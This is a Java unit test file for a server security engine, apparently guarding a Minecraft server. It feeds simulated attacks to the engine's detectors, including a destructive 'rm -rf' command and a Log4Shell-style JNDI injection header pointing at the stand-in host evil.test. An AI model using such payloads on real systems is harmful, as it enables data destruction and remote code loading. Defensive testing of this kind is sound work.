package com.aluer.kernel;

import com.aluer.config.ServerGuardConfig;
import com.aluer.security.CommandExecutionGuardService;
import com.aluer.security.DDoSProtectionService;
import com.aluer.security.FirewallService;
import com.aluer.security.GeoIPService;
import com.aluer.security.IPReputationService;
import com.aluer.security.IntrusionDetectionService;
import com.aluer.security.NetworkMonitorService;
import com.aluer.security.NetworkThreatFusionService;
import com.aluer.security.PacketInspectionService;
import com.aluer.security.PortScanDetectionService;
import com.aluer.security.RateLimitService;
import com.aluer.security.SecurityBaselineHardeningService;
import com.aluer.security.TrafficAnalysisService;
import com.aluer.security.WebApplicationFirewall;
import org.junit.jupiter.api.Test;

import java.lang.reflect.Field;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ExecutorService;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertFalse;
import static org.junit.jupiter.api.Assertions.assertTrue;

class AluerKernelEngineTest {

    @Test
    void kernelPulseGeneratesCommandAbuseDirectiveAndEchoMemory() throws Exception {
        try (Fixture fixture = new Fixture()) {
            fixture.commandGuard.analyzeCommand("tester", "rm -rf /var/tmp/aluer", "198.51.100.60");
            fixture.waf.checkRequest(
                "198.51.100.60",
                "POST",
                "/console",
                null,
                Map.of("X-Exploit", "${jndi:ldap://evil.test/a}"),
                null
            );

            AluerKernelEngine.KernelPulse pulse = fixture.kernel.runKernelPulse("test-command");

            assertTrue(pulse.getHeat() >= 60);
            assertEquals("COMMAND_ABUSE_RESPONSE", pulse.getDirective().getWorkflow());

            @SuppressWarnings("unchecked")
            List<Map<String, Object>> echoCells = (List<Map<String, Object>>) fixture.kernel.getKernelMatrix().get("echoCells");
            assertFalse(echoCells.isEmpty());
            assertEquals("198.51.100.60", echoCells.get(0).get("target"));
        }
    }

    @Test
    void kernelPulseUsesThreatMeshForHighNetworkPressure() throws Exception {
        try (Fixture fixture = new Fixture()) {
            String ip = "203.0.113.44";
            fixture.ddos.blockIP(ip, "SYN_FLOOD", "burst");
            fixture.firewall.addToBlacklist(ip);
            fixture.portScan.blockScanner(ip, "PORT_SCAN", "scanner");
            fixture.ipReputation.addToBlacklist(ip);
            fixture.packetInspection.inspectPacket(ip, Map.of("size", 16000));
            fixture.networkMonitor.recordInboundTraffic(ip, 25_000_000L, 120);

            AluerKernelEngine.KernelPulse pulse = fixture.kernel.runKernelPulse("test-network");

            assertTrue(pulse.getResonance() >= 50);
            assertTrue(
                List.of("L34_DDOS_RESPONSE", "L7_DDOS_RESPONSE", "MC_BOT_SWARM_RESPONSE", "HOST_INTRUSION_RESPONSE")
                    .contains(pulse.getDirective().getWorkflow())
            );
            assertTrue(fixture.kernel.getKernelStatus().containsKey("lastPulse"));
        }
    }

    private static final class Fixture implements AutoCloseable {
        private final ServerGuardConfig config = new ServerGuardConfig();
        private final DDoSProtectionService ddos = new DDoSProtectionService();
        private final FirewallService firewall = new FirewallService();
        private final IntrusionDetectionService intrusion = new IntrusionDetectionService();
        private final NetworkMonitorService networkMonitor = new NetworkMonitorService();
        private final TrafficAnalysisService traffic = new TrafficAnalysisService();
        private final PortScanDetectionService portScan = new PortScanDetectionService();
        private final PacketInspectionService packetInspection = new PacketInspectionService();
        private final IPReputationService ipReputation = new IPReputationService();
        private final GeoIPService geoIP = new GeoIPService();
        private final RateLimitService rateLimit = new RateLimitService();
        private final NetworkThreatFusionService threatFusion = new NetworkThreatFusionService(
            ddos,
            firewall,
            intrusion,
            networkMonitor,
            traffic,
            portScan,
            packetInspection,
            ipReputation,
            geoIP,
            rateLimit
        );
        private final SecurityBaselineHardeningService hardeningService;
        private final CommandExecutionGuardService commandGuard;
        private final WebApplicationFirewall waf = new WebApplicationFirewall();
        private final AluerKernelEngine kernel;

        private Fixture() {
            config.getSecurity().getKernel().setEnabled(false);
            config.getMinecraft().getRcon().setPassword("this-is-a-strong-rcon-password");
            config.getSecurity().getHostEnforcement().setEnabled(true);
            config.getSecurity().getHostEnforcement().setDryRun(false);
            config.getAi().getDeepseek().getAutoExecute().setEnabled(true);
            config.getAi().getDeepseek().getAutoExecute().setMinConfidence(92);

            hardeningService = new SecurityBaselineHardeningService(config);
            commandGuard = new CommandExecutionGuardService(config, intrusion);
            kernel = new AluerKernelEngine(config, threatFusion, hardeningService, commandGuard, waf);
        }

        @Override
        public void close() throws Exception {
            shutdownExecutors(ddos, firewall, intrusion, networkMonitor, traffic, portScan, packetInspection, ipReputation, rateLimit);
        }

        private void shutdownExecutors(Object... services) throws Exception {
            for (Object service : services) {
                for (Field field : service.getClass().getDeclaredFields()) {
                    field.setAccessible(true);
                    Object value = field.get(service);
                    if (value instanceof ExecutorService executorService) {
                        executorService.shutdownNow();
                    }
                }
            }
        }
    }
}
